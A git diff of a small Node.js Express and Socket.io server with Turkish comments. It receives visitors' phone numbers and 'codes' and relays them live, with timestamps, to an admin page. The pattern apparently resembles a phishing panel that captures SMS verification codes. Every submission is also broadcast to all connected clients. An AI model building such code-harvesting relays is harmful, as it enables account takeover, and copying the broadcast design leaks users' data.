@@ -1,43 +1,43 @@
-const path = require('path');  // Bu satırı en üstte ekle
 const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
-const io = require('socket.io')(http);
-const cors = require('cors');
+const path = require('path');
 
-// CORS izinleri - Vercel domain'ine izin ver (veya '*' ile tüm domain'lere)
-app.use(cors({
-  origin: 'https://walker-wti.vercel.app',  // Frontend domain'in (Vercel)
-  methods: ['GET', 'POST'],  // İzin verilen method'lar
-  allowedHeaders: ['Content-Type']  // İzin verilen header'lar
-}));
+// Socket.io'yu CORS ile başlat (Vercel domain'ine izin ver, wildcard '*' ile test için tüm domain'lere açabilirsin)
+const io = require('socket.io')(http, {
+  cors: {
+    origin: "https://walker-wti.vercel.app",  // Frontend domain'in, veya "*" ile test et
+    methods: ["GET", "POST"],
+    allowedHeaders: ["Content-Type"],
+    credentials: true
+  }
+});
 
-app.use(express.static(path.join(__dirname, "")));  // Root'tan
+// Root'tan static serve et
+app.use(express.static(path.join(__dirname, "")));
 
-/* ANA SAYFA */
+// Ana sayfa
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "", "index.html"));
 });
-/* ADMIN SAYFASI */
+
+// Admin sayfası
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "", "admin.html"));
 });
-
 
 // Socket.io bağlantısı
 io.on('connection', (socket) => {
   console.log('Bir kullanıcı bağlandı');
 
-  // Frontend'den gelen phone'u al, admin'e broadcast et
   socket.on('new-phone', (phone) => {
     console.log('Yeni telefon: ' + phone);
-    io.emit('new-user-phone', phone);  // Admin'e anında gönder (new-user-phone event'i)
+    io.emit('admin-new-phone', { phone: phone, date: new Date().toLocaleString() });
   });
 
-  // Frontend'den gelen code'u al, admin'e broadcast et
   socket.on('new-code', (code) => {
     console.log('Yeni code: ' + code);
-    io.emit('new-user-code', code);  // Admin'e anında gönder (new-user-code event'i)
+    io.emit('admin-new-code', { code: code, date: new Date().toLocaleString() });
   });
 
   socket.on('disconnect', () => {
@@ -45,7 +45,7 @@ io.on('connection', (socket) => {
   });
 });
 
-// Sunucuyu dinle (port 3000 veya Heroku port'u)
+// Sunucuyu dinle
 const port = process.env.PORT || 3000;
 http.listen(port, () => {
   console.log(`Sunucu ${port} portunda çalışıyor`);
